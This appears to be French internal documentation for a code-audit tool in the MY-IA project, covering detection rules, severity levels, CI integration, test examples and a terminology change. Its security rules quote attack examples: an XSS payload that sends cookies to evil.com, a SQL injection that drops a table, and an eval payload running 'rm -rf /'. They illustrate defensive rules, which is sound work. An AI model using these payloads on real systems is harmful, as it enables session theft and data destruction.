Objectifs de l'Audit — Section 1

⬆ Sommaire

Pourquoi auditer ?

🛡️ Sécurité
Détecter les vulnérabilités avant qu'elles ne soient exploitées (injections, XSS, CSRF, etc.)
🏗️ Qualité
Garantir le respect des patterns architecturaux et la maintenabilité du code
📊 Performance
Identifier les anti-patterns qui dégradent les performances (N+1, DOM lent)
⚖️ Conformité
Assurer la conformité RGPD, accessibilité WCAG, et bonnes pratiques i18n

Catégories d'Audit — Section 2

⬆ Sommaire

L'audit couvre 5 catégories principales, chacune avec ses règles spécifiques :

🛡️ SECURITY — Sécurité & OWASP
  • Injections SQL (f-strings, concaténation)
  • XSS (innerHTML non sécurisé)
  • CSRF (tokens manquants)
  • Secrets hardcodés
  • Authentification/Autorisation
🏗️ ARCH — Architecture & Patterns
  • Logique DB dans les routers
  • Validation dans les services (pas routers)
  • Séparation des responsabilités
  • Imports circulaires
  • Couplage fort entre modules
🎨 UI — Interface & Rendu
  • innerHTML sans Templates
  • Styles inline (style="")
  • SVG inline (utiliser Icons)
  • DOM manipulation directe
  • Event listeners non nettoyés
🔔 UX — Expérience Utilisateur
  • Textes non traduits (i18n)
  • Toasts erreur éphémères
  • Feedback utilisateur manquant
  • Accessibilité (ARIA, contraste)
  • Messages d'erreur génériques
♻️ MAINTENANCE — DRY & Nettoyage
  • Routes API orphelines
  • Code dupliqué
  • Imports inutilisés
  • Fichiers morts
  • TODO/FIXME non résolus

Règles de Détection — Section 4

⬆ Sommaire

Chaque règle est documentée avec son pattern de détection, la raison pour laquelle elle est nécessaire, et son statut d'implémentation.

Sécurité (SECURITY)

🚨 Les failles de sécurité peuvent entraîner : vol de données utilisateur, compromission du serveur, usurpation d'identité, et responsabilité légale (RGPD).
RèglePatternGrav.Impl.
SQL Injection
Pattern : .execute(f" ou .execute(' + variable
Pourquoi : Un attaquant peut injecter du SQL malveillant via les entrées utilisateur (formulaires, URL). Cela permet de lire toute la base de données, modifier/supprimer des enregistrements, ou exécuter des commandes système (via xp_cmdshell sur SQL Server).
Exemple d'attaque : '; DROP TABLE users; --
OWASP : A03:2021 - Injection
SQL Injection (f-string) .execute(f"SELECT...{var}") HIGH ✅
SQL Injection (concat) .execute("SELECT" + var) HIGH ✅
Cross-Site Scripting (XSS)
Pattern : .innerHTML = sans Templates.render
Pourquoi : L'injection de HTML/JavaScript dans une page permet à un attaquant de voler les cookies/tokens JWT, rediriger vers des sites de phishing, exécuter des actions au nom de l'utilisateur (virement, changement de mot de passe).
Exemple d'attaque : <img src=x onerror="fetch('https://evil.com?c='+document.cookie)">
OWASP : A03:2021 - Injection
XSS via innerHTML el.innerHTML = userInput HIGH ✅
Secrets Hardcodés
Pattern : password = "...", api_key = "..."
Pourquoi : Les secrets en dur dans le code sont exposés dans le dépôt Git (même après suppression, ils restent dans l'historique). Un accès au repo = accès à tous les systèmes connectés. Les bots scannent GitHub en permanence pour trouver des clés AWS, tokens API, etc.
Conséquence : Factures cloud de milliers d'euros, fuite de données, compromission totale.
OWASP : A02:2021 - Cryptographic Failures
Secrets hardcodés password|api_key|secret = "..." HIGH ✅
Eval/Exec Dynamique
Pattern : eval(user_input), exec(data)
Pourquoi : eval() et exec() exécutent du code Python arbitraire. Si l'entrée provient de l'utilisateur, il peut exécuter n'importe quelle commande sur le serveur : lire des fichiers, installer des backdoors, accéder au réseau interne.
Exemple d'attaque : __import__('os').system('rm -rf /')
OWASP : A03:2021 - Injection
Eval dynamique eval(, exec( avec variable HIGH ✅
Debug Mode en Production
Pattern : debug=True, DEBUG=True hors tests
Pourquoi : Le mode debug expose des informations sensibles : stack traces complètes, variables d'environnement, chemins fichiers, versions des dépendances. Ces informations facilitent les attaques ciblées. De plus, certains frameworks (Flask, Django) activent un débogueur interactif permettant l'exécution de code.
OWASP : A05:2021 - Security Misconfiguration
Debug mode debug=True hors tests HIGH ❌
CSRF (Cross-Site Request Forgery)
Pattern : Forms POST sans csrf_token
Pourquoi : Sans protection CSRF, un site malveillant peut soumettre des requêtes au nom de l'utilisateur connecté. L'attaquant crée une page avec un formulaire caché qui pointe vers votre application. Si l'utilisateur visite cette page alors qu'il est connecté, l'action est exécutée (virement, suppression de compte...).
Note MY-IA : FastAPI avec JWT dans headers (pas cookies) est moins vulnérable, mais les formulaires HTML classiques restent à risque.
OWASP : Anciennement Top 10, maintenant couvert par A01:2021 - Broken Access Control
CSRF manquant Forms POST sans token HIGH ❌
Secrets dans les Logs
Pattern : logger.info(f"Token: {token}")
Pourquoi : Les logs sont souvent stockés en clair, envoyés à des services tiers (Datadog, ELK), et accessibles à plusieurs personnes de l'équipe. Logger un mot de passe ou token expose ce secret à quiconque a accès aux logs, et crée une trace permanente de la fuite.
OWASP : A09:2021 - Security Logging and Monitoring Failures
Secrets loggés logger.*(password|token) HIGH ❌
Headers de Sécurité
Pattern : Absence de CSP, X-Frame-Options, X-Content-Type-Options
Pourquoi : Ces headers indiquent au navigateur comment se protéger :
• CSP : Bloque l'exécution de scripts non autorisés (anti-XSS)
• X-Frame-Options : Empêche l'intégration en iframe (anti-clickjacking)
• X-Content-Type-Options : Force le type MIME déclaré (anti-MIME sniffing)
Sans ces headers, le navigateur applique des règles permissives par défaut.
OWASP : A05:2021 - Security Misconfiguration
Headers sécurité Absence CSP, X-Frame-Options MEDIUM ❌
HTTP sans TLS
Pattern : http:// dans URLs (hors localhost)
Pourquoi : Le trafic HTTP est non chiffré et peut être intercepté par quiconque sur le même réseau (attaque man-in-the-middle). Mots de passe, tokens, données personnelles transitent en clair. Les WiFi publics sont particulièrement risqués.
OWASP : A02:2021 - Cryptographic Failures
HTTP sans TLS http:// hors localhost MEDIUM ❌

Architecture (ARCH)

🏗️ Les problèmes d'architecture entraînent : code non testable, bugs difficiles à tracer, duplication, et dette technique exponentielle.
RèglePatternGrav.Impl.
Logique DB dans Router
Pattern : db.add(), db.commit() dans router.py
Pourquoi : Le router doit uniquement recevoir la requête, valider les entrées, et appeler le service. La logique de persistance dans le router :
• Empêche les tests unitaires (nécessite une vraie DB)
• Duplique le code si la même opération est utilisée ailleurs
• Mélange les responsabilités (violation du principe Single Responsibility)
Solution : Déplacer vers service.py ou repository.py
DB dans router db.add/commit/execute dans router.py MEDIUM ✅
Import Circulaire
Pattern : Module A importe B, et B importe A
Pourquoi : Les imports circulaires causent :
• ImportError au démarrage (attribut non défini)
• Comportements imprévisibles selon l'ordre d'import
• Signal d'architecture couplée (modules trop dépendants)
Solution : Extraire le code commun dans un troisième module, ou utiliser l'injection de dépendances
Import circulaire Imports mutuels entre modules MEDIUM ❌
N+1 Queries
Pattern : Boucle avec db.execute ou await session.get
Pourquoi : Pour N éléments, le code effectue N+1 requêtes au lieu d'une seule. Avec 100 éléments, c'est 100x plus de latence réseau et de charge DB.
Exemple problème : for doc in docs: author = await get_user(doc.author_id)
Solution : Utiliser joinedload(), selectinload(), ou une requête avec IN (:ids)
Impact : Pages lentes, timeouts, surcharge base de données
N+1 queries Boucle + db.execute MEDIUM ❌
God Class / Fichier Trop Long
Pattern : Fichier > 500 lignes ou classe > 20 méthodes
Pourquoi : Un fichier trop long indique :
• Trop de responsabilités (devrait être découpé)
• Difficulté de navigation (temps perdu à chercher)
• Conflits Git fréquents (plusieurs devs sur le même fichier)
• Tests complexes (setup lourd pour tester une partie)
Seuils : 500 lignes (warning), 1000 lignes (critique)
God class Fichier > 500 lignes LOW ❌

Interface (UI)

🎨 Les problèmes UI entraînent : performances dégradées, incohérence visuelle, maintenance difficile, et fuites mémoire.
RèglePatternGrav.Impl.
innerHTML sans Templates
Pattern : .innerHTML = sans Templates.render()
Pourquoi : Même sans risque XSS (données internes), innerHTML pose des problèmes :
• Pas d'échappement automatique (risque si les données changent)
• Reconstruction complète du DOM (perte d'état, event listeners)
• HTML éparpillé dans le JS (difficile à maintenir)
Solution : Templates.render('template-name', data)
innerHTML direct .innerHTML = sans Templates LOW ✅
Event Listeners Orphelins
Pattern : addEventListener sans removeEventListener correspondant
Pourquoi : Les listeners non supprimés causent :
• Fuites mémoire (l'élément reste référencé)
• Handlers dupliqués (si le code est réexécuté)
• Comportements imprévisibles (ancien code toujours actif)
Solution : Supprimer dans destroy() ou utiliser { once: true }
Event listener orphelin addEventListener sans remove LOW ❌
DOM dans Boucle
Pattern : appendChild ou innerHTML += dans une boucle
Pourquoi : Chaque modification du DOM déclenche un reflow/repaint coûteux. Dans une boucle de 100 itérations, c'est 100 reflows au lieu d'un seul.
Impact : UI qui "freeze", scrolling saccadé, mauvaise expérience
Solution : Construire le HTML en mémoire (DocumentFragment ou string), puis insérer une seule fois
DOM dans boucle appendChild dans for/while LOW ❌
Style inline JS .style.property = LOW ✅
SVG inline <svg au lieu de Icons. LOW ✅
createElement manuel document.createElement LOW ✅
Style inline JS .style.property = dans JS LOW ✅ SVG inline <svg dans HTML au lieu de Icons. LOW ✅ createElement manuel document.createElement au lieu de Templates LOW ✅ Event listener orphelin addEventListener sans removeEventListener LOW ❌ DOM dans boucle appendChild ou innerHTML dans for/while LOW ❌

UX & Maintenance

🔔 Les problèmes UX/Maintenance entraînent : utilisateurs frustrés, support accru, dette technique, et difficulté d'onboarding des nouveaux développeurs.
RèglePatternGrav.Impl.
Toast Non Traduit
Pattern : showToast("Message hardcodé") sans t('cle')
Pourquoi : Les textes hardcodés :
• Cassent l'i18n (utilisateurs non-francophones voient du français)
• Compliquent les modifications (chercher dans tout le code)
• Créent des incohérences (même message formulé différemment)
Solution : showToast(t('document.saved'), 'success')
Toast non traduit showToast( sans t( MEDIUM ✅
Toast Erreur Éphémère
Pattern : showToast(..., 'error') sans duration: 0
Pourquoi : Une erreur qui disparaît après 3 secondes :
• Frustre l'utilisateur (pas le temps de lire)
• Empêche le diagnostic (quelle erreur exactement ?)
• Génère du support ("ça ne marche pas" sans détails)
Solution : showToast(t('error.upload'), 'error', 0) — l'utilisateur ferme manuellement
Toast erreur éphémère 'error' sans 0) MEDIUM ✅
console.log Résiduel
Pattern : console.log() hors fichiers debug
Pourquoi : Les logs de développement en production :
• Polluent la console (difficile de trouver les vrais problèmes)
• Exposent des informations (structure données, tokens parfois)
• Image non professionnelle (les utilisateurs voient la console)
Solution : Supprimer ou conditionner avec if (DEBUG)
console.log résiduel console.log( LOW ✅
TODO / FIXME Non Résolu
Pattern : // TODO, # FIXME, HACK, XXX
Pourquoi : Les TODO oubliés :
• S'accumulent (dette technique invisible)
• Perdent leur contexte (l'auteur a oublié pourquoi)
• Signalent du code incomplet (bugs potentiels)
• FIXME/HACK = problème connu non corrigé
Solution : Créer un ticket et référencer, ou corriger immédiatement
TODO/FIXME TODO|FIXME|HACK|XXX LOW ✅
ARIA Manquant
Pattern : <button> ou <input> sans aria-label
Pourquoi : Les attributs ARIA sont essentiels pour :
• Lecteurs d'écran (utilisateurs malvoyants)
• Navigation clavier (contexte des éléments)
• Conformité légale (RGAA, WCAG 2.1 AA obligatoire secteur public)
Exemple : <button aria-label="Fermer la fenêtre">×</button>
ARIA manquant Boutons/inputs sans aria-label MEDIUM ❌
Route API Orpheline
Pattern : Route définie côté backend mais jamais appelée côté frontend
Pourquoi : Les routes orphelines :
• Augmentent la surface d'attaque (endpoints oubliés, moins testés)
• Compliquent la maintenance (est-ce utilisé ? par qui ?)
• Alourdissent la documentation (API plus grande que nécessaire)
Solution : Supprimer ou documenter l'usage prévu
Route orpheline Route non appelée dans frontend LOW ❌
Import Inutilisé
Pattern : from module import X où X n'est jamais utilisé
Pourquoi : Les imports inutilisés :
• Ralentissent le démarrage (chargement de modules inutiles)
• Créent de la confusion (ce module est-il nécessaire ?)
• Peuvent causer des erreurs (si le module importé est supprimé)
Outils : autoflake, ruff --fix
Import inutilisé Import non utilisé LOW ❌
Fichier Vide / Mort
Pattern : Fichier < 10 lignes, ou fichier jamais importé
Pourquoi : Les fichiers morts :
• Encombrent l'arborescence (bruit visuel, recherche polluée)
• Créent de la confusion (ce fichier sert-il encore ?)
• Augmentent la taille du dépôt (git history, backups)
Solution : Supprimer ou documenter l'usage futur
Fichier vide/mort Fichier < 10 lignes ou non importé LOW ❌

Niveaux de Gravité — Section 5

⬆ Sommaire
HIGH — Critique
Impact : Compromission système, fuite de données, exécution de code
Délai correction : Immédiat (24-48h)
Exemples : SQL Injection, XSS, secrets exposés
MEDIUM — Important
Impact : Dégradation qualité, dette technique, maintenance difficile
Délai correction : Sprint suivant (1-2 semaines)
Exemples : Logique DB dans router, toasts non traduits
LOW — Mineur
Impact : Incohérence, non-respect conventions, code mort
Délai correction : Backlog (1-3 mois)
Exemples : innerHTML, routes orphelines, TODO non résolus

Calcul du score de santé

📊 Formule : Santé = (Succès / (Succès + Échecs)) × 100
Objectif : > 90% sur toutes les catégories
Seuil alerte : < 70% déclenche une revue obligatoire

Structure des Recommandations — Section 7

⬆ Sommaire

Chaque recommandation suit le format Risque → Solution → Bénéfice :

🔴 Quel est le risque ?
Expliquer l'impact concret d'une non-correction (faille exploitée, bug utilisateur, dette technique)
🛠️ Quelle est la solution ?
Décrire l'action technique précise avec exemple de code si pertinent
✅ Quel est le bénéfice ?
Quantifier l'amélioration : sécurité renforcée, maintenance simplifiée, performances accrues

Exemple de recommandation

⚠️ Problème : innerHTML = userInput dans UI-FRONT/js/chat.js

🔴 Risque : Un attaquant peut injecter du JavaScript malveillant via le chat, volant les tokens JWT ou exécutant des actions au nom de l'utilisateur.

🛠️ Solution : Utiliser Templates.render('message', {content: userInput}) qui échappe automatiquement le HTML.

✅ Bénéfice : Immunité contre les attaques XSS, conformité OWASP A03.

Intégration CI/CD — Section 9

⬆ Sommaire

GitHub Actions (exemple)

# .github/workflows/audit.yml
name: Security Audit

on:
  push:
    branches: [main, dev]
  schedule:
    - cron: '0 6 * * 1'  # Chaque lundi 6h

jobs:
  audit:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4

      - name: Run audit
        run: python scripts/test/run_audit.py

      - name: Check HIGH vulnerabilities
        run: |
          if grep -q '"crit": "HIGH"' docs/audit-reports/AUDIT-REPORT-*.html; then
            echo "::error::HIGH severity issues found!"
            exit 1
          fi

      - name: Upload report
        uses: actions/upload-artifact@v4
        with:
          name: audit-report
          path: docs/audit-reports/

Tests d'Audit — Section 11

⬆ Sommaire

Objectifs des tests

✅ Vrais Positifs
Vérifier que chaque règle détecte correctement les vulnérabilités connues
❌ Faux Positifs
S'assurer que le code sain ne déclenche pas d'alertes inutiles
⚠️ Faux Négatifs
Tester les variantes de failles pour éviter les contournements
🔄 Régression
Garantir qu'une règle modifiée continue de détecter les anciens cas

Exemple de test unitaire

# tests/audit/test_security_rules.py
import pytest
from scripts.test.run_audit import AuditRunner

class TestSQLInjection:
    def test_detects_fstring_in_execute(self, tmp_path):
        """Doit détecter f-string dans execute()"""
        vuln_file = tmp_path / "app" / "bad.py"
        vuln_file.parent.mkdir(parents=True)
        vuln_file.write_text('db.execute(f"SELECT * FROM users WHERE id={user_id}")')

        runner = AuditRunner(root_dir=str(tmp_path))
        runner._audit_security()

        findings = runner.categories["SECURITY"].findings
        assert len(findings) == 1
        assert findings[0].rule == "SQL Injection (f-string)"
        assert findings[0].severity == "HIGH"

    def test_ignores_parameterized_query(self, tmp_path):
        """Ne doit PAS détecter les requêtes paramétrées"""
        safe_file = tmp_path / "app" / "good.py"
        safe_file.parent.mkdir(parents=True)
        safe_file.write_text('db.execute(text("SELECT * WHERE id=:id"), {"id": uid})')

        runner = AuditRunner(root_dir=str(tmp_path))
        runner._audit_security()

        assert len(runner.categories["SECURITY"].findings) == 0

Terminologie : Collections → Bibliothèques — Section 15

⬆ Sommaire

Constat

Le terme « Collection » désigne actuellement deux concepts distincts dans MY-IA, ce qui crée une ambiguïté pour les utilisateurs et les développeurs :

ConceptContexteDescriptionExemple
Collection utilisateur UI, BDD PostgreSQL Conteneur logique de documents + conversations. Un privé par user, N publics par admin. « Ma collection », « Documents RH »
Collection ChromaDB Technique, stockage vectoriel Container de vecteurs dans ChromaDB. Plusieurs par collection user (1 par provider LLM). user_550e84_ollama, public_rh_llamacpp

Glossaire cible

ConceptAncien termeNouveau terme (FR)Nouveau terme (EN)Scope
Conteneur documents user/adminCollectionBibliothèqueLibraryUI, traductions, docs
Bibliothèque privée (1 par user)Collection privéeMa bibliothèqueMy libraryUI-FRONT
Bibliothèque publique (admin)Collection publiqueBibliothèque partagéeShared libraryUI-BACK, UI-FRONT
Container vectoriel ChromaDBCollectionCollection (inchangé)Collection (inchangé)Code backend, logs

Hiérarchie finale

Utilisateur (1)
  └─ Bibliothèque privée (1)          ← « Ma bibliothèque »
       ├─ Documents (N)
       ├─ Conversations (N)
       └─ Corpus (optionnel)
            ├─ Documents (N)
            └─ Sources (N)

Admin
  └─ Bibliothèques partagées (N)      ← visibles par tous
       ├─ Documents (N)
       └─ Corpus (optionnel)

--- Couche technique (invisible pour l'utilisateur) ---

Bibliothèque « Documents RH »
  ├─ Collection ChromaDB : public_rh_ollama
  └─ Collection ChromaDB : public_rh_llamacpp
